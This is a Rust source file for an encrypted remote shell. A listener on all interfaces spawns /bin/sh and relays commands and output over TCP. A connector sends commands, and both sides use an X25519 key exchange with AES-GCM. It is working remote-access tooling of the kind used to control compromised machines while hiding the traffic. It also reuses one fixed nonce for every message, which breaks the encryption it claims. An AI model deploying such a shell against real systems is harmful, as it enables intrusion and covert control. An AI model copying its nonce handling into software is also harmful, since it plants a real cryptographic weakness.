use std::{error::Error, io::{BufRead, Read, Write}, net::{TcpListener, TcpStream}, process::{Command, Stdio}, thread};

use aes_gcm::{aead::Aead, Aes256Gcm, Key, KeyInit, Nonce};
use rand::{rngs::OsRng};
use sha2::Sha256;
use sha2::digest::Digest;
use x25519_dalek::{EphemeralSecret, PublicKey};


fn generate_keypair() -> (EphemeralSecret, PublicKey) {
    let private = EphemeralSecret::random_from_rng(OsRng);
    let public = PublicKey::from(&private);
    (private, public)
    
}

pub fn derive_shared_key(private: EphemeralSecret, peer_public: PublicKey) -> [u8; 32] {
    let shared_secret = private.diffie_hellman(&peer_public);
    let mut hasher = Sha256::new();
    hasher.update(shared_secret.as_bytes());
    hasher.finalize().into()
}


fn send_encrypted(stream: &mut TcpStream, key: &Key<Aes256Gcm>, data: &[u8]) -> Result<(), Box<dyn Error>> {
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(b"unique_nonce"); // 12 bytes
    let ciphertext = cipher.encrypt(nonce, data).map_err(|_| format!("encryption failed"))?;
    stream.write_all(&(ciphertext.len() as u32).to_be_bytes())?;
    stream.write_all(&ciphertext)?;
    Ok(())
}

fn receive_encrypted(stream: &mut TcpStream, key: &Key<Aes256Gcm>) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(b"unique_nonce");
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf)?;
    let len = u32::from_be_bytes(len_buf) as usize;
    let mut buffer = vec![0u8; len];
    stream.read_exact(&mut buffer)?;
    let plaintext = cipher.decrypt(nonce, buffer.as_ref()).map_err(|_| format!("decryption failed"))?;
    Ok(plaintext)
}



fn handle_client(mut stream: TcpStream) -> Result<(), Box<dyn Error>> {
    // Key exchange
    let (priv_key, pub_key) = generate_keypair();
    stream.write_all(pub_key.as_bytes())?;
    let mut peer_pub_bytes = [0u8; 32];
    stream.read_exact(&mut peer_pub_bytes)?;
    let peer_pub = PublicKey::from(peer_pub_bytes);
    let shared_key = derive_shared_key(priv_key, peer_pub);
    let aes_key = Key::<Aes256Gcm>::from_slice(&shared_key).clone();

    // Shell process
    let mut child = Command::new("/bin/sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;

    let mut child_stdin = child.stdin.take().unwrap();
    let mut child_stdout = child.stdout.take().unwrap();
    let mut stream_clone = stream.try_clone()?;
    let key_clone = aes_key;

    thread::spawn(move || {
        loop {
            match receive_encrypted(&mut stream, &key_clone) {
                Ok(cmd) => {
                    let _ = child_stdin.write_all(&cmd);
                }
                Err(_) => break,
            }
        }
    });

    loop {
        let mut buffer = [0u8; 1024];
        let n = child_stdout.read(&mut buffer)?;
        if n == 0 {
            break;
        }
        send_encrypted(&mut stream_clone, &aes_key, &buffer[..n])?;
    }
    Ok(())
}

pub fn start_listener(port: u16) -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind(("0.0.0.0", port))?;
    println!("🔒 Listening for remote shell on port {}...", port);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("✅ Connection established from {}", stream.peer_addr()?);
                thread::spawn(|| {
                    if let Err(e) = handle_client(stream) {
                        eprintln!("❌ Client error: {}", e);
                    }
                });
            }
            Err(e) => eprintln!("❌ Connection failed: {}", e),
        }
    }
    Ok(())
}

pub fn start_connector(ip: &str, port: u16) -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect((ip, port))?;
    println!("🔐 Connected to remote shell at {}:{}", ip, port);

    // Key exchange
    let (priv_key, pub_key) = generate_keypair();
    let mut peer_pub_bytes = [0u8; 32];
    stream.read_exact(&mut peer_pub_bytes)?;
    stream.write_all(pub_key.as_bytes())?;
    let peer_pub = PublicKey::from(peer_pub_bytes);
    let shared_key = derive_shared_key(priv_key, peer_pub);
    let aes_key = Key::<Aes256Gcm>::from_slice(&shared_key).clone();

    let mut stream_clone = stream.try_clone()?;
    let key_clone = aes_key;

    thread::spawn(move || {
        loop {
            match receive_encrypted(&mut stream, &key_clone) {
                Ok(output) => print!("{}", String::from_utf8_lossy(&output)),
                Err(_) => break,
            }
        }
    });

    let stdin = std::io::stdin();
    for line in stdin.lock().lines() {
        let line = line? + "\n";
        send_encrypted(&mut stream_clone, &aes_key, line.as_bytes())?;
    }
    Ok(())
}
